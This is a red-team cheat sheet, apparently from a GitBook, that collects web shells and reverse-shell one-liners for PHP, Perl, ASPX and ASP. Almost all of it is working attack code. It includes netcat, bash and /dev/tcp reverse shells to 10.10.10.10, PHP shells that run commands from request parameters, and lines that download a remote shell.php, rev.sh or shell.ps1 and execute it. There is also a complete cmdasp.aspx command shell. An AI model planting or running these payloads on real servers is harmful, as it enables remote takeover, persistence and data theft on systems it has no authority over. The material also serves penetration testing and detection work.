---
metaLinks:
  alternates:
    - >-
      https://app.gitbook.com/s/qDX4NWkPelZggTpGCfyF/offensive-treasure/red-team/execution/web-shell
---

# Web Shell

## PHP Reverse Shell

### PHP - Netcat

{% code overflow="wrap" %}
```php
<?php system("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.10.10 80 >/tmp/f"); ?> 
```
{% endcode %}

### PHP - Bash

```php
<?php
$sock=fsockopen("10.10.10.10",1234);
exec("/bin/bash -i <&3 >&3 2>&3");
?>

php -r '$sock=fsockopen("10.10.10.10",1234);exec("/bin/bash -i <&3 >&3 2>&3");'
```

### PHP Command Execution

```php
# save to a file
<?php system($_REQUEST['cmd']); ?>
<?php system($_GET['cmd']); ?>
<?php system($_REQUEST ["cmd"]); ?>
<?php ${system('nc 10.10.10.10 4444 -e /bin/bash')}; ?>
'<?php passthru("bash -i >& /dev/tcp/10.10.10.10/80 0>&1"); ?>'
```

### PHP - Download

```php
<?php exec("wget -O /var/www/html/shell.php http://10.10.10.10/shell.php"); ?>
```

### PHP - Command Execution

```php
bash -c 'bash -i >& /dev/tcp/10.10.10.10/4444 0>&1' > rev.sh
<?php system('curl 10.10.10.10/rev.sh | bash'); ?>
```

## Perl

{% code overflow="wrap" %}
```bash
perl -e 'use Socket;$i="10.10.10.10";$p=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/bash -i");};'
```
{% endcode %}

## ASPX

```bash
<%
Set rs = CreateObject("WScript.Shell")
Set cmd = rs.Exec("cmd /c whoami")
o = cmd.StdOut.Readall()
Response.write(o)
%>

<%
Set rs = CreateObject("WScript.Shell")
Set cmd = rs.Exec("cmd /c powershell -c iex(new-object net.webclient).downloadstring('http://10.10.10.10:5555/shell.ps1')")
o = cmd.StdOut.Readall()
Response.write(o)
%>
```

{% code title="cmdasp.aspx" %}
```bash
<%@ Page Language="C#" Debug="true" Trace="false" %>
<%@ Import Namespace="System.Diagnostics" %>
<%@ Import Namespace="System.IO" %>
<script Language="c#" runat="server">
void Page_Load(object sender, EventArgs e)
{
}
string ExcuteCmd(string arg)
{
ProcessStartInfo psi = new ProcessStartInfo();
psi.FileName = "cmd.exe";
psi.Arguments = "/c "+arg;
psi.RedirectStandardOutput = true;
psi.UseShellExecute = false;
Process p = Process.Start(psi);
StreamReader stmrdr = p.StandardOutput;
string s = stmrdr.ReadToEnd();
stmrdr.Close();
return s;
}
void cmdExe_Click(object sender, System.EventArgs e)
{
Response.Write("<pre>");
Response.Write(Server.HtmlEncode(ExcuteCmd(txtArg.Text)));
Response.Write("</pre>");
}
</script>
<HTML>
<HEAD>
<title>awen asp.net webshell</title>
</HEAD>
<body >
<form id="cmd" method="post" runat="server">
<asp:TextBox id="txtArg" style="Z-INDEX: 101; LEFT: 405px; POSITION: absolute; TOP: 20px" runat="server" Width="250px"></asp:TextBox>
<asp:Button id="testing" style="Z-INDEX: 102; LEFT: 675px; POSITION: absolute; TOP: 18px" runat="server" Text="excute" OnClick="cmdExe_Click"></asp:Button>
<asp:Label id="lblText" style="Z-INDEX: 103; LEFT: 310px; POSITION: absolute; TOP: 22px" runat="server">Command:</asp:Label>
</form>
</body>
</HTML>
```
{% endcode %}

```bash
<html>
<body>    
<form method="post" action="./abaredteam.aspx" id="ctl00">
<div class="aspNetHidden">
<input type="hidden" name="__VIEWSTATE" id="__VIEWSTATE" value="/wEPDwUKLTk5MjkzMTA5MWRkqnW3A3XJf51UWUD2B/WKEqzy75196guiwN6wpBe5Y+c=" />
</div>

<div class="aspNetHidden">

	<input type="hidden" name="__VIEWSTATEGENERATOR" id="__VIEWSTATEGENERATOR" value="1DD36CC1" />
	<input type="hidden" name="__EVENTVALIDATION" id="__EVENTVALIDATION" value="/wEdAAQJC5Gj0+FR6cB7mH2o6jlhEfa0FWw4vgp/0+fu1qvypQc3B/7KMkdKn/DwVeVRtd5jVtf4N5S/d4eaM1iQEKJvQFQON07VyPSM0IJno0nGELZDAS4cHtrIxF8Z5kNwsnA=" />
</div>        
<p><span id="L_p" style="display:inline-block;width:80px;">Program</span>        
<input name="xpath" type="text" value="c:\windows\system32\cmd.exe" id="xpath" style="width:300px;" />        
<p><span id="L_a" style="display:inline-block;width:80px;">Arguments</span>        
<input name="xcmd" type="text" value="/c net user" id="xcmd" style="width:300px;" />        
<p><input type="submit" name="Button" value="Run" id="Button" style="width:100px;" />        
<p><span id="result"></span>       
</form>
</body>
</html>
```

## ASP

{% code overflow="wrap" %}
```bash
<%response.write CreateObject("WScript.Shell").Exec(Request.QueryString("cmd")).StdOut.Readall()%>

curl 10.10.10.10/cmd.asp?cmd=whoami
```
{% endcode %}
